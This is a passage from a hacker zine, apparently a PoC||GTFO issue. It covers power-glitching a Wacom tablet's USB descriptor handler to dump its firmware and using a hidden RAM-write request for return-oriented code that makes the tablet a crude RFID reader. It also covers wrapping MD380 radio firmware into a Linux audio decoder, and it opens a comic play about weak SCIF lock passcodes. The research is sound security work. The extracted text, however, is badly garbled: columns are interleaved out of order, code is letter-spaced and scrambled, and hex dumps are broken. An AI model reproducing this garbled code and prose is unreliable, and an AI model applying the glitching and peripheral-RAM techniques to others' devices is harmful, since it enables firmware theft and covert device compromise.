tom Wacom silicon, recent enough to be both cheap
and plentiful on the second-hand market.
Greetings, neighbors!
Today, like most days, I would like to celebrate
the diversity of tiny machines around us. This time
I’ve prepared a USB magic trick of sorts, incorpo-
rating techniques from the analog and the digital
domains.
Regular readers will be well aware that computer
peripherals are typically general-purpose computers
themselves, and the operating system often trusts
them a little too much. Devices attached to Thun-
derbolt (PCI Express) are trusted as much as the
CPU. Devices attached to USB, at best, are as privi-
leged as the user, who can typically do anything they
want albeit slowly and using interfaces designed for
meat. 11 If that USB device can exploit a bug in lit-
erally any available driver, the device could achieve
even more direct levels of control.
4.1
A Very Descriptive Descriptor
Typically you need firmware to analyze a device.
Documented interfaces are the tip of the iceberg. To
really see what a device is capable of, you need to
see everything the firmware knows how to do. Some-
times this is easy to get. Back in PoCkGTFO 7:3
when I was reversing an optical drive, the firmware
was plainly available from the manufacturer’s web
site. Usually you won’t be so lucky. Manufactur-
ers often encrypt firmware to hide their crimes or
slow down clones, and some devices don’t appear to
support firmware updates at all.
This device seemed to be the latter kind. No
firmware updates online. No hints of a firmware up-
dating process hidden in their drivers. The CPU
was something I didn’t recognize at first. I posted
11 unzip
pocorgtfo13.pdf meat.txt
30R4
49
GND
1k
26
USB_MOSI
TIO2
USB_RESET
USB_GPX
R8
3.3V
PD4
PD3
R7
3.3V
VCC
GND
1k
LED3
VBUS
5
2
USB
GND@1
GND@2
31the photo to Twitter, and Ladyada recognized it as
a Sanyo/ONsemi LC87, an 8-bit micro that seems
to be mostly used in Japanese consumer electron-
ics. It comes in both flash and ROM versions, both
of which I would later find in these tablets. Test
points were available for an on-chip debugger, but I
couldn’t find the debug adapter for sale anywhere
nor could I find any documentation for the pro-
tocol. I even found the firmware for this myste-
rious TCB87-TypeC debug adapter, and a way to
disassemble it, but the actual debug port was im-
plemented by a custom peripheral on the adapter’s
CPU. I tried various bit twiddling and pulse pushing
in hopes of getting a response from the debug port,
but my best guess is that it’s been disabled.
moving as many sources of jitter as possible, glitches
can be delivered more reliably to the intended oper-
ation within the target’s firmware.
My humble addon is the FaceWhisperer, a
USB host controller based on the MAX3421E
chip, inspired of course by Travis Goodspeed’s
Facedancer21 tool. Whereas the USB host controller
in your PC will be subject to many influences far
outside your control, the USB host in the FaceWhis-
perer can be precisely synchronized with both the
target device and the ChipWhisperer itself.
Putting everything on the same clock is neces-
sary but not sufficient for cycle-accurate timing re-
peatability. The LC87, like many microcontrollers,
will boot from a free-running RC oscillator before
switching to the external clock under software con-
trol. This means it’s necessary to synchronize with
the running firmware somehow before starting up
the USB host. In this case, I’m using a comparator
input on the FaceWhisperer to precisely wait on a
debug signal that indicates the beginning of a tablet
scanning cycle.
The GET_DESCRIPTOR request we’re interested in
comes in several parts: a SETUP token that describes
what descriptor we’d like to read, some IN tokens
that each ask the device to send back one more
packet, and finally an OUT for acknowledgment.
These phases each drive a forgetful state machine
that wakes up on each interrupt and leaves notes to
itself for what needs to be done to the next packet.
Unlike antique asynchronous serial ports, USB de-
vices can never speak to the host unless they’re of-
fered a timeslot with an IN token, so no matter how
badly we glitch the firmware we do need to follow
this flow in order to read back data from the device.
This firmware extraction glitch works by disrupt-
ing the calculation and/or storage of the descriptor
length, between that SETUP and the first IN. To ex-
tract as much data as possible, the SETUP can have
a length limit of 0xFFFF and the FaceWhisperer can
continue spamming IN tokens until something fails.
With this infrastructure in place, the ChipWhis-
perer’s Glitch Explorer can hone in on timing off-
sets and glitch parameters that give us longer than
usual descriptor responses. By briefly interrupting
power at slightly different timing offsets after the
SETUP packet, a variety of glitched behavior can be
observed.
The descriptor we’ll be reading is the USB Con-
figuration Descriptor, typically one of the longest
descriptors a device will provide. This device has a
At this point, the remaining options are more di-
rect. A sufficiently funded and motivated researcher
could certainly break out the micropositioners and
acid, reading the data directly from on-chip busses.
But this is needlessly complex and expensive. This
is a USB device after all, and we have a perfectly
good off-chip bus that can already do many things.
In fact, when you attach a USB device to your PC,
it typically hands very small pieces of its firmware
back to the PC in order to identify itself. We think of
these USB Descriptors as data tables, not part of the
firmware at all, but where else would they be stored?
On an embedded device where RAM is so precious,
the descriptor chunks will be copied directly from
Flash or Mask ROM into the USB endpoint buffer.
It’s a tiny engine designed to read parts of firmware
out over USB, and nearly every USB device has code
like this.
If this code is functioning properly, it will read
back only the USB descriptor tables, and nothing
else. If there’s a bug in the size calculation, you
may be able to request more data. If there isn’t
already a bug, you can introduce one via clock or
power glitching.
Introducing a bug at just the right time can be
tricky, so this is where it helped to build a new tool.
Well, a tiny add-on for a masterful existing tool:
the ChipWhisperer-Lite by Colin O’Flynn. The
ChipWhisperer is an open source platform for side-
channel power analysis and glitching. The joy of
having both power analysis and glitching in the same
platform is that they can be on the same reference
clock. With one oscillator, you can deterministically
step your target device through its paces, measure
its activity via the power consumption waveform,
and deliver glitches to specific clock cycles. By re-
323334-byte descriptor that we’ll be trying to glitch into
something much longer. Usually the whole thing
comes back in one packet:
PCB design and source for FaceWhisperer and play
along. 12
This sort of side-channel analysis still requires a
bit of PCB surgery in order to set up the device’s
power rails and clock for glitching and monitoring.
It also helps to have a reset signal and some sort
of GPIO that can be used as a timing reference. It
would be interesting future work to see how far this
setup could be reduced. Could the glitching be per-
formed solely via the USB port, even through what-
ever power regulation and conditioning the device
includes?
IN
2 0 9 0 2 2 2 0 0 0 1 0 1 0 0 8 0 1 E0904000001030102000921
0001000122920007058103090004
4 r c o d e 5 t o t a l 34
Sometimes our glitches occur while copying the
IN data itself. These aren’t useful on their own, but
they can give some feedback on how well the glitch
is working:
IN
2 0 9 0 2 2 2 0 0 0 1 0 1 0 0 8 0 1 E0904000001030102000921
21FFFFFFFF20D227FFFFFFFFFF20
4 r c o d e 5 t o t a l 34
4.2
Coding in Disappearing Ink
The documentation for the LC87 architecture is
sparse. I eventually found an instruction encoding
table buried in some product-line-specific appendix,
but for a while the only resource I could find was
a freeware toolchain, including a compiler and an
on-chip debugger. I had already taken a look at this
debugger in an attempt to awaken the debug port on
my tablet. It wouldn’t do much without this myste-
rious TCB87-TypeC dongle, but I tried simulating
the TCB87 with a GreatFET that mostly just pre-
tends things are okay and tells this RD87 debugger
whatever it wants to hear. When I get the debugger
to start up, it begins populating the hex views with
zeroes. After a quick look with the USB analyzer, I
easily find the requests that are the same size as the
device’s memory and begin answering those with my
firmware dump. Now I have a debugger that I can
use for static analysis!
I was looking for some kind of update mech-
anism. I would later discover that this tablet
(firmware 1.16) used mask ROM whereas many ear-
lier tablets (1.13) used flash memory. Those 1.13
tablets do seem to have a bootloader of some kind
available, but I haven’t looked into it yet. With the
1.16 tablet I had been analyzing, though, I became
fairly certain there was no intended way to modify
the device’s program memory. This gave me a new
constraint, which turns out to be interesting any-
way: Turn the tablet into an RFID reader without
modifying its firmware. We’ll do this entirely via
RAM and return-oriented programming.
The next step was much easier than expected.
There was plenty of hidden functionality in the
firmware. These are things that aren’t part of any
When you’re getting close, you start to see non-
corrupted descriptors that have a longer than ex-
pected length:
IN
2 0 9 0 2 2 2 0 0 0 1 0 1 0 0 8 0 1 E0904000001030102000921
0001000122920007058103090004090222000101
4 0080160904000001030102000921000100012292
0 0 0 7 0 5 8 1 0 3 0 9 0 0 0 4 0 9 0 2 3 B000201008016090400
6 0001030102000921000100012292000705810309
0 0 0 4 0 9 0 4 0 1 0 0 0 1 0 3 0 0 0 0 0 0 0 9 2 1 0 0 0 1 0 0 0 1 2 2 0 F00
8 0 7 0 5 8 2 0 3 4 0 0 0 0 4 0 4 0 3 0 9 0 4 1 E035700610063006F
006 D00200043006F002E002C004C00740064002E
10 0 0 1 0 0 3 4 3 0 0 5 4 0 0 4 5 0 0 2 D00340035003000100343
00540045002 D0036003500300010034D00540045
12 002 D0034003500300010034D00540045002D0036
0 0 3 5 0 0 3 0 0 0 6 8 0 2 6 8 0 1 6 8 0 2 6 8 0 1 6 8 0 2 6 8 0 0 6 8 0 3 F0
14 00 F001F003F00270017002700070037000700370
00 B801B800B801B8
16 r c o d e 5 t o t a l 268
Only a little more of that, and we find a glitched
configuration descriptor that’s 65,534 bytes long,
more than enough to reconstruct the entire 32 kB
firmware ROM. You only get the memory prior to
the descriptor if the address space wraps, but fortu-
nately for us this was the case. All that’s left is to
determine the address offset by looking for clues like
an IVT at the beginning or unused memory near the
end of the image, and correctly align the resulting
32 kB image.
If you’d like to try this technique on your own
devices with the ChipWhisperer, you can grab the
12 git clone https://github.com/scanlime/facewhisperer
unzip pocorgtfo13.pdf facewhisperer.tar.bz2
34standard and aren’t used by the official drivers, but
presumably exist for factory test purposes. There’s
a mode you can put the tablet in which enables
an additional USB endpoint that returns loads of
timers and internal debug info. Oh, and there’s a
HID request that will just write exactly 16 bytes
into RAM anywhere you like!
This is enough to start testing the waters and
building up more and more complex ROP code. The
ROM is only 32kB, and barely half full, but there are
some useful gadgets. We can make function calls, do
memcpy, RAM-to-RAM and ROM-to-RAM. Inter-
rupts are tricky. I tried coexisting with them for a
while, but had to give up on that due to USB packet
corruption issues I couldn’t track down. Write an
arbitrary byte? Look up where we’d find that in
ROM and do a memcpy. Loops are the slowest.
These ROP stack frames can only execute once be-
fore they’re corrupted, so we must copy the code
each time it’s run. It’s slow, but we’re doing arbi-
trary things to this peripheral that we haven’t even
written any code to. We can even return it to nor-
mal operation if we like, by jumping back to the
main loop and restoring a normal stack.
I think this was used in conjunction with another
routine that isn’t called anywhere, which tests the
custom silicon Sanyo added for Wacom. Oh, custom
silicon. I was hoping not to find that here. Newer
tablets have chips that are obviously designed by
Wacom to be complete analog frontends. I wanted
to start with an older tablet that would have fewer
custom parts. But perhaps the “W” in LC871W32
stands for Wacom. The analog frontend is made
from discrete components in this tablet; multiplex-
ers to select from an array of coils, op-amps to inte-
grate the received signals, a buffer to excite the coils
with a carrier wave. When I first looked at the cir-
cuit, it seemed like the 750 kHz carrier wave itself as
well as the other timing signals would be generated
using general-purpose peripherals on the micro. But
when I look for the corresponding GPIO pins, noth-
ing. More reverse engineering, and it was clear that
I was facing custom hardware. I’ve been calling it
FEB0h, after its I/O address. At first I thought it
was a serial engine of some sort that was being mis-
used to run the tablet, but now it’s clear that this
hardware is purpose-built. More on that later. For
now, it’s enough to know that the hardware or the
mask ROM itself had enough engineering risk that
they thought it prudent to include such a powerful
test feature.
This is not typically the sort of operation your
OS requires elevated privileges for. The underly-
ing Send Feature Report operation is typically as-
sociated with harmless device-specific features like
toggling your keyboard LEDs, not with writing ar-
bitrary instructions to a Turing-complete processor
that is trusted by the OS just as much as you are.
Applications can typically reserve access to any HID
device that doesn’t already have a driver loaded.
It’s easy to imagine some desktop malware that un-
loads or subverts the default driver long enough to
load some malware into a peripheral’s RAM with-
out subsequent detection by either the user or the
driver.
4.3
Amplitude Modulation Alchemy
Wacom pens and passive RFID cards are broadly
similar, in that they both use a resonant LC circuit
to pick up some energy from the reader’s chang-
ing magnetic field, then they send back data bits
with backscatter modulation, selectively shorting
out the coil. The specific mechanism is a bit dif-
ferent though, and it will make our job harder. A
typical 125 kHz RFID reader is sending out either a
continuous carrier, or perhaps sending long bursts a
few times a second to save energy. During this burst,
the reader is continuously listening for a modulated
response, with hardware filters specifically tuned to
this job.
35The EM4100 pads the 40-bit code out to a 64-bit
repeating pattern with the addition of a 9-bit header
and a matrix of parity bits. Each bit is Manchester
encoded; 0 becomes 10, 1 becomes 01. Each half-bit
lasts 32 clock cycles, giving us a conveniently slow
data rate.
The pulsed carrier is a problem. The RFID card
does have its little tuning fork, and it keeps ringing
a little bit, but not as much as you might think, es-
pecially when the EM4100 chip is trying to power
itself from this stored energy and the external car-
rier has disappeared. A clock cycle or two, but not
nearly as long as the tablet’s A/D conversion takes.
This little bit of unpredictability, though, has so far
foiled every plan of mine to stay in sync with the
signal in order to sample it at or below the bit rate.
My workaround has been to use a short enough car-
rier pulse in order to have multiple samples per bit,
allowing me to occasionally use a pile of filters and
heuristics to recover the correct bits with appropri-
ate deference to Nyquist. The problem with using
a shorter carrier pulse is that it lowers our carrier
duty cycle, delivering less power to the RFID card.
So, there’s a delicate balance: long enough to power
the card, short enough for the resulting data to be
intelligible through this intermittent sampling.
The returned signal is quite weak, since the
tablet’s filters are looking for resonance at a very
different frequency. This is an area where I’ve seen
much difference between individual RFID tags. Un-
der unrealistic conditions, with the RFID tag placed
directly on the tablet circuit board, many tags read
successfully without much trouble. With an unmod-
ified and fully assembled tablet, I’ve had very diffi-
cult to reproduce results, occasionally reading only
one of the several tags I tried the setup with.
If you want to try this experiment or others, you
can find my simple ROP toolkit and signal process-
ing for the CTE-450 and try your luck with the
return-oriented analog hacking. 13
Wacom tablets, by contrast, are all about se-
quentially scanning an array of coils. This CTE-450
tablet has 12 short and wide horizontal coils on the
front side (Y00 through Y11) and 17 tall and thin
vertical coils on the back side (X00 to X16). When it
has no idea where the pen might be, it has to scan
everywhere. After locating the pen, it can adjust
the scanning pattern to take differential measure-
ments from the tablet coils nearest the pen coil. In-
stead of transmitting and receiving simultaneously,
the filtering can be simplified by toggling between
two modes. When transmitting, a 74HC125 buffer
drives the coil with the tablet’s carrier wave. During
this time, the analog integrator is zeroed. Then the
tablet switches modes, and begins integrating the
received signal.
These resonant LC circuits are like electromag-
netic tuning forks. An RFID tag or a Wacom
pen have a tuning fork at a specific frequency, and
some circuitry that communicates each bit by either
damping the oscillations or letting them ring. The
Wacom tablet shouts at the tuning fork’s frequency,
quickly and abruptly, and immediately listens for
the reverberation. The whole protocol is designed
around this mode switch. Gaps in the carrier in-
dicate the bit boundaries, and longer bursts divide
packets.
The trick here is to use this mechanism to read
some common RFID access card. Between the slow
return-oriented programming and the limited ana-
log frontend, I picked an easy target for the PoC.
The EM4100 is a common 125 kHz tag with a fixed
40-bit ID. It’s no more secure than a pin tumbler
lock for sure, but it isn’t too far from the tags used
in many access control systems.
4.4
More to do
Although so far I’ve only managed to transform this
tablet into an extremely bad RFID reader, I think
this shows that the overall approach may lead some-
where. The main limitations here are in the reliance
on slow ROP, and the relatively low quality A/D
converter on the LC871. I’ve done my best to try
13 git clone https://github.com/scanlime/cte450-homebrew/
unzip pocorgtfo13.pdf cte450-homebrew.tar.bz2
36and separate the signal from the noise, but I’m no
DSP guru. It’s possible that a signal processing ex-
pert could be snooping tags with a better success
rate than I’ve been seeing. As a proof of concept,
this shows that the transformation from tablet to
RFID reader is theoretically doable, though with-
out a significant improvement in range it’s hard to
imagine this approach succeeding at reading access
cards casually left against a victim’s graphics tablet.
It could be interesting to examine newer tablets.
The custom silicon in FEB0h turned out to be one of
the best things about the CTE-450 tablet, making it
relatively easy to change the timing and carrier fre-
quency. If newer tablets have a nicer A/D converter
and a programmable filter on the receive path, they
could make a decent RFID reader indeed. A brief
look at my newer Intuos Pro tablet shows a Renesas
processor that likely has reprogrammable flash.
There’s certainly more work to do in discov-
ering the scope of devices vulnerable to glitched
GET_DESCRIPTOR requests. What other devices that
we usually think of as black-box peripherals might
have firmware that can be read out, or RAM that
we can temporarily hide code in?
It may be possible to mitigate these glitched
GET_DESCRIPTOR firmware readouts by adding ad-
ditional verification steps in the device’s USB stack,
which would each also need to be glitched. Reducing
the number of invalid states that eventually result
in spilling data will make the glitching process much
more tedious.
In practice, though, I would argue that the best
security is not to rely on secret firmware at all. Al-
gorithms shouldn’t need secrecy to keep them se-
cure. Debug features that are too dangerous to
leave should be disabled, not hidden. If any sensitive
data must be reachable from the CPU, it should be
unmapped whenever possible, especially when some
USB controller asks for your life story.
375
Decoding AMBE+2 in MD380 Firmware in Linux
by Travis Goodspeed KK4VCZ
with kind thanks to DD4CR, DF8AV, and AB3TL
Howdy y’all,
In PoCkGTFO 10:8, I shared with you fine folks
a method for extracting a cleartext firmware dump
from the Tytera MD380. Since then, a rag-tag gang
of neighbors has joined me in hacking this device,
and hundreds of amateur radio operators around
the world are using our enhanced firmware for DMR
communications.
AMBE+2 is a fixed bit-rate audio compression
codec under some rather strict patents, for which
the anonymously-authored Digital Speech Decoder
(DSD) project 14 is the only open source decoder. It
doesn’t do encoding, so if for example you’d like to
convert your favorite Rick Astley tunes to AMBE
frames, you’ll have to resort to expensive hardware
converters.
In this article, I’ll show you how I threw to-
gether a quick and dirty AMBE audio decompressor
for Linux by wrapping the firmware into a 32-bit
ARM executable, then running that executable ei-
ther natively or through Qemu. The same tricks
could be used to make an AMBE encoder, or to
convert nifty libraries from other firmware images
into handy command-line tools.
This article will use an MD380 firmware image
version 2.032 for specific examples, but in the spirit
of building our own bird feeders, the techniques
ought to apply just as well to your own firmware
images from other devices.
–——–
———
—–—–
Suppose that you are reverse engineering a
firmware image, and you’ve begun to make good
progress. You know where plenty of useful func-
tions are, and you’ve begun to hook them, but now
you are ready to start implementing unit tests and
debugging chunks of code. Wouldn’t it be nicer to
do that in Unix than inside of an embedded system?
As luck would have it, I’m writing this article
on an aarch64 Linux machine with eight cores and
a few gigs of RAM, but any old Raspberry Pi or
Android phone has more than enough power to run
this code natively.
Be sure to build statically,
targeting
arm-linux-gnueabi. The resulting binary will run
on armel and aarch64 devices, as well as damned
14 git
near any Linux platform through Qemu’s userland
compatibility layer.
5.1
Dynamic Firmware Loading
First, we need to load the code into our process.
While you can certainly link it into the executable,
luck would have it that GCC puts its code sections
very low in the executable, and we can politely ask
mmap(2) to load the unpacked firmware image to
the appropriate address. The first 48kB of Flash
are used for a recovery bootloader, which we can
conveniently skip without consequences, so the load
address will be 0x0800c000.
2
4
6
8
s i z e _ t l e n g t h =994304;
i n t f d=open ( " e x p e r i m e n t . img " , 0 ) ;
void ∗ f i r m w a r e=mmap(
( void ∗ ) 0 x0800c000 , l e n g t h ,
PROT_EXEC|PROT_READ|PROT_WRITE,
MAP_PRIVATE,
// f l a g s
fd ,
// f i l e
0
// o f f s e t
);
Additionally, we need the 128kB of RAM at
0x20000000 and 64kB of TCRAM at 0x10000000
that the firmware expects on this platform. Since
we’d like to have initialized variables, it’s usually
better go with dumps of live memory from a running
system, but /dev/zero works for many functions if
you’re in a rush.
clone https://github.com/szechyjs/dsd
381
3
5
7
9
// Load an SRAM image .
i n t fdram=open ( "ram . b i n " , 0 ) ;
void ∗ sram=mmap(
( void ∗ ) 0 x20000000 ,
( s i z e _ t ) 0 x20000 ,
PROT_EXEC|PROT_READ|PROT_WRITE,
MAP_PRIVATE,
// f l a g s
fdram ,
// f i l e
0
// o f f s e t
);
can easily export symbols by script from IDA Pro
or Radare2.
The symbol file is just a collection of assignments
of names to addresses in roughly C syntax.
/∗ P o p u l a t e s t h e a u d i o b u f f e r ∗/
2 ambe_decode_wav = 0 x08051249 ;
/∗ J u s t r e t u r n s . ∗/
4 n u l l s u b = 0 x08098e15 ;
11
13
15
17
19
21
// C r e a t e an empty TCRAM r e g i o n .
i n t f d t c r a m=open ( " / dev / z e r o " , 0 ) ;
void ∗ tcram=mmap(
( void ∗ ) 0 x10000000 ,
( s i z e _ t ) 0 x10000 ,
PROT_READ|PROT_WRITE, // p r o t e c t i o n s
MAP_PRIVATE,
// f l a g s
fdtcram ,
// f i l e
0
// o f f s e t
);
5.2
You can include it in the executable by passing
GCC parameters to the linker, or by calling ld di-
rectly.
CC=arm−l i n u x −gnueabi−gcc −6 − s t a t i c −g
2 $ (CC) −o t e s t t e s t . c \
−X l i n k e r −−j u s t −symbols=symbols
Now that we can load the firmware into process
memory and call its functions, let’s take a step back
and see a second way to do the linking, by rewrit-
ing the firmware dump into an ELF object and then
linking it. After that, we’ll get along to decoding
some audio.
Symbol Imports
Now that we’ve got the code loaded, calling it is as
simple as calling any other function, except that our
C program doesn’t yet know the symbol addresses.
There are two ways around this:
The quick but dirty solution is to simply cast a
data or function pointer. For a concrete example,
there is a null function at 0x08098e14 that sim-
ply returns without doing anything. Because it’s
a Thumb function and not an ARM function, we’ll
have to add one to that address before calling it at
0x08098e15.
5.3
While it’s nice and easy to load firmware with
mmap(2) at runtime, it would be nice and correct
to convert the firmware dump into an object file for
static linking, so that our resulting executable has
no external dependencies at all. This requires both
a bit of objcopy wizardry and a custom script for
ld.
First, let’s convert our firmware image dump to
an ELF that loads at the proper address.
void ( ∗ n u l l s u b ) ( ) =(void ∗ ) 0 x08098e15 ;
2
p r i n t f ( " Trying t o c a l l n u l l s u b ( ) . \ n" ) ;
4 nullsub () ;
p r i n t f ( " S u c c e s s ! \ n" ) ;
Static Firmware Linking
1 arm−l i n u x −gnueabi−o b j c o p y
\
−I b i n a r y e x p e r i m e n t . img
\
3
−−change−a d d r e s s e s =0x0800C000
\
−−rename−s e c t i o n . data =. e x p e r i m e n t
\
5
−O e l f 3 2 −l i t t l e a r m −B arm e x p e r i m e n t . o
Similarly, you can access data that’s in Flash or
RAM.
Sadly, ld will ignore our polite request
to load this image at 0x08000C000, be-
cause load addresses in Unix are just po-
lite suggestions, to be thrown away by the
linker.
We can fix this by passing -Xlinker
–section-start=.experiment=0x0800C000 to gcc
at compile time, so ld knows to place the section at
the right address.
Similarly, the SRAM image can be embedded at
its own load address.
1 p r i n t f ( " M a n u f a c t u r e r i s : ’% s ’ \ n" ,
0 x080f9e4c ) ;
Casting function pointers gets us part of the way,
but it’s rather tedious and wastes a bit of memory.
Instead, it’s more efficient to pass a textfile of sym-
bols to the linker. Because this is just a textfile, you
39405.4
Decoding the Audio
To decode the audio, I decided to begin with the
same .amb format that DSD uses. This way, I could
work from their reference files and compare my de-
coding to theirs.
The .amb format consists of a four byte header
(2e 61 6d 62) followed by eight-byte frames. Each
frame begins with a zero byte and is followed by
49 bits of data, stored most significant bit first with
the final bit in the least significant bit of its own
byte.
To have as few surprises as possible, I take the
eight packed bytes and extract them into an array of
49 shorts located at 0x20011c8e, because this is the
address that the firmware uses to store its buffer.
Shorts are used for convenience in addressing dur-
ing computation, even if they are a bit more verbose
than they would be in a convenient calling conven-
tion.
1 //Re−u s e t h e f i r m w a r e ’ s own AMBE b u f f e r .
short ∗ambe=(short ∗ ) 0 x 2 0 0 1 1 c 8 e ;
3
i n t ambei =0;
5 f o r ( i n t i =1; i <7; i ++){ // S k i p f i r s t b y t e .
f o r ( i n t j =0; j <8; j ++){
7
//MSBit f i r s t
ambe [ ambei++]=(packed [ i ]>>(7− j ) ) &1;
9
}
}
11 // F i n a l b i t i n i t s own frame as LSBit .
ambe [ ambei++]=packed [ 7 ] & 1 ;
1 // P l a c e d a t 0 x08051249
i n t ambe_decode_wav (
3
signed short ∗ w a v b u f f e r ,
signed i n t e i g h t y , // a l w a y s 80
5
short ∗ b i t b u f f e r ,
// 0 x20011c8e
i n t a4 ,
// 0
7
short a5 ,
// 0
short a6 ,
// t i m e s l o t , 0 or 1
9
i n t a7
// 0 x20011224
);
For any parameter that I don’t understand, I
just copy the value that I’ve seen called through my
hooks in the firmware running on real hardware. For
example, 0x20011224 is some structure used by the
AMBE code, but I can simply re-use it thanks to
my handy RAM dump.
Since everything is now in the right position, we
can decode a frame of AMBE to two audio frames
in quick succession.
//One AMBE frame becomes two a u d i o frames .
2 ambe_decode_wav (
outbuf0 , 8 0 , ambe ,
4
0, 0, 0,
0 x20011224
6
);
ambe_decode_wav (
8
ou tbuf1 , 8 0 , ambe ,
0, 0, 1,
10
0 x20011224
);
After dumping these to disk and converting to
a .wav file with sox -r 8000 -e signed-integer
-L -b 16 -c 1 out.raw out.wav, a proper audio
file is produced that is easily played. We can now
decode AMBE in Linux!
Additionally, I re-use the output buffers to store
the resulting WAV audio. In the MD380, there are
two buffers of audio produced from each frame of
AMBE.
// 80 s a m p l e s f o r each a u d i o b u f f e r
2 short ∗ o u t b u f 0 =(short ∗ ) 0 x20011aa8 ;
short ∗ o u t b u f 1 =(short ∗ ) 0 x20011b48 ;
The thread that does the decoding in firmware is
tied into the MicroC/OS-II realtime operating sys-
tem of the MD380. Since I don’t have the timers and
interrupts to call that thread, nor the I/O ports to
support it, I’ll instead just call the decoding routines
that it calls.
415.5
5.6
Runtime Hooks
What about those I/O functions that we’ve forgot-
ten to hook, or ones that have been inlined to a
dozen places that we’d rather not hook? Wouldn’t
it sometimes be easier to trap the access and fake
the result, rather than hooking the same function?
You’re in luck! Because this is Unix, we can sim-
ply create a handler for SIGSEGV, much as Jeffball
did in PoCkGTFO 8:8. Your segfault handler can
then fake the action of the I/O device and return.
Alternately, you might not bother with a proper
handler. Instead, you can use GDB to debug the
process, printing a backtrace when the I/O region
at 0x40000000 is accessed. While GDB in Qemu
doesn’t support ptrace(2), it has no trouble trap-
ping out the segmentation fault and letting you
know which function attempted to perform I/O.
So now we’re able to decode audio frames, but this is
firmware, and damned near everything of value ex-
cept the audio routines will eventually call a function
that deals with I/O—a function we’d better replace
if we don’t want to implement all of the STM32’s
I/O devices.
Luckily, hooking a function is nice and easy. We
can simply scan through the entire image, replac-
ing all BX (Branch and eXchange) instructions to
the old functions with ones that direct to the new
functions. False positives are a possibility, but we’ll
ignore them for now, as the alternative would be to
list every branch that must be hooked.
The BL instruction in Thumb is actually two ad-
jacent 16-bit instructions, which load a low and high
half of the address difference into the link register,
then BX against that register. (This clobbers the
link register, but so does any BL, so the register use
is effectively free.)
5.7
/∗ The BL i n s t r u c t i o n i s a c t u a l l y two
Thumb i n s t r u c t i o n s , w i t h one s e t t i n g
t h e h i g h p a r t o f t h e LR and t h e o t h e r
s e t t i n g t h e low p a r t w h i l e swapping
LR and PC. ∗/
i n t h i =0xF000 | ( ( o f f s e t &0xFFF800 ) >>11) ;
i n t l o =0xF800 | ( o f f s e t &0x7FF ) ;
13
15
17
19
Conclusion
Thank you kindly for reading my ramblings about
ARM firmware. I hope that you will find them
handy in your own work, whenever you need to work
with reverse engineered firmware away from its own
hardware.
If you’d like to similarly instrument Linux ap-
plications, take a look at Jonathan Brossard’s
Witchcraft Compiler Collection, 15 an interactive
ELF shell that makes it nice and easy to turn an
executable into a linkable library.
The emulator from this article has now been in-
corporated into my md380tools 16 project, for use in
Linux.
1 /∗ C a l c u l a t e s Thumb code t o branch from
one a d d r e s s t o a n o t h e r . ∗/
3 i n t c a l c b l ( i n t adr , i n t t a r g e t ) {
/∗ Begin w i t h t h e d i f f e r e n c e o f t h e t a r g e t
5
and t h e PC, which p o i n t s t o j u s t a f t e r
t h e c u r r e n t i n s t r u c t i o n . ∗/
7
i n t o f f s e t=t a r g e t −adr −4;
// LSBit doesn ’ t c o u n t .
9
o f f s e t =( o f f s e t >>1) ;
11
I/O Traps
Cheers from Varaždin, Croatia,
–Travis 6A/KK4VCZ
// Return t h e p a i r as a s i n g l e 32− b i t word .
return ( l o <<16) | h i ;
21 }
Now that we can calculate function call instruc-
tions, a simple loop can patch all calls from one ad-
dress into calls to a second address. You can use this
to hook the I/O functions live, rather than trapping
them.
15 git clone https://github.com/endrazine/wcc
unzip pocorgtfo13.pdf wcc.tar.bz2
16 git clone https://github.com/travisgoodspeed/md380tools
426
Password Weaknesses in Physical Security:
Silliness in Three Acts
by Evan Sultanik
Dramatis Personæ
Disembodied Voice of Pastor Manul Laphroaig . . . . . . . . . . . . . . . . . . Bard
Alice Feynman . . . . . . . . . . . . . Disciple of the Church of Weird Machines
Bob Schrute . . . . . . . . . . . . . . . . . Assistant to the Facility Security Officer
Havva al-Kindi . . . . . . . . . . . . . . . . . . . . . . Alice’s Old and Wise Officemate
The Ghost of Paul Erdős . . . . . . . . . . . . . . . . . . . . . . . . Keeper of The Book
Act I: Memorize, Don’t Compromise
Alice: How do they work?
Pastor: In the windowless bowels of a nonde-
script, Class A office building entrenched in-
side the Washington, D.C. beltway, we meet
our heroine, Alice Feynman, lost on her way
to a meeting with the Facility Security Officer.
Bob: [Throwing Alice the lock’s manual.] They
run off of the electricity generated from spin-
ning them, so you need to spin them a bit to
get started. You see? The LCD on top shows
you the current number. You enter three two-
digit numbers. First one clockwise, second
counter-clockwise, third clockwise, and then
a final spin counter-clockwise to open. That’s
the passcode.
Alice: Excuse me, which way is it to the secu-
rity office?
Bob: You must be the new hire. Bob Schrute,
assistant FSO. I can take you there right after
I finish with this. . .
Alice: [Flipping through the manual.]
each lock get a different passcode?
Alice: Alice. Nice to meet you. What’re you
doing?
Does
Bob: Yes. That’s why we have this [handing
Alice a magnet stuck to the side of the door ].
Bob: Kaba Mas X-09 high security spin-lock.
It’s DSS-approved for use in our SCIFs. I’m
resetting this one’s passcode.
Alice: Ah I see. It’s a phone keypad. So you
use a mnemonic to remember each passcode?
Bob: Exactly. [Pointing to a poster on the wall
with his own mugshot and memetic letters em-
blazoning “MEMORIZE, DON’T COMPRO-
MISE”, he sternly repeats that slogan:] Mem-
orize, don’t compromise.
Alice: [Blank Stare]
Bob: U.S. Department of Defense (DoD) De-
fense Security Service (DSS). Sensitive Com-
partmented Information Facilities (SCIFs).
The rooms where we are allowed to store and
process classified information?
Alice: [“Is this guy serious?” face.]
Bob: You think you could crack it? FALSE.
[Flamboyantly produces a pocket calculator
that had been hidden somewhere on his per-
son.] Three two-digit numbers. That’s 100
times 100 times 100, so . . . there are a mil-
lion possible codes. I’ve set this to have a
timeout of four minutes after each failed at-
tempt. So, trying all possible combinations
Alice: I see. I noticed those things all over this
building.
Bob: They’re ubiquitous. You’ll see them any-
where in the country there’s classified work go-
ing on. One on each door, and another on each
safe. Super secure, too. Security in this office
is no joke.
43would take . . . [furiously punching at the calcu-
lator ] . . . almost eight years! We change each
code once every couple months, so even if you
could continuously try codes for eight hours
a day, you’d have . . . [more furious punching]
. . . about seven tenths of one percent chance
of getting the code right.
Alice: [Handing the manual back.] I didn’t see
anything in here about an automatic lockout
after too many failed attempts.
Bob: [Pointing to his minuscule biceps.] These
provide the lockout.
Alice: Are you ready to take me to the security
office now?
Bob: Fine.
Act II: Surely You’re Joking
Pastor: Two weeks later, Alice has settled into
her office, which she shares with Havva al-
Kindi. She hasn’t had a chance to play with
those nifty locks at all yet; her clearance is still
being processed. Most of her time is spent
idling or doing busy-work while she waits to
